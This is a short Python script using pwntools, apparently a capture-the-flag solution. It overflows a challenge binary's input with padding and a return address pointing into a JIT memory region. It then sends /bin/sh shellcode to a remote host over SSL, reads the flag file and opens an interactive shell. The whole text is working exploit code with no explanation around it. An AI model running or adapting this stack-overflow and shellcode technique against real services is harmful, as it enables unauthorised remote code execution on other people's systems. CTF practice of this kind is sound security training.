from pwn import *

elf = ELF("./challenge")
context.binary = elf

JIT_AREA = 0x42420000
HOST = 'nkrmojmm.vuln.gg'
PORT = 443

size_str = b"256"
padding = b"A" * (56 - len(size_str))
ret_addr = p64(JIT_AREA)
size = size_str + padding + ret_addr

shellcode = asm(shellcraft.sh())

io = remote(HOST, PORT, ssl=True)
io.send(size)
time.sleep(0.2)
io.send(shellcode)

io.sendline(b'cat /flag.*')
io.interactive()
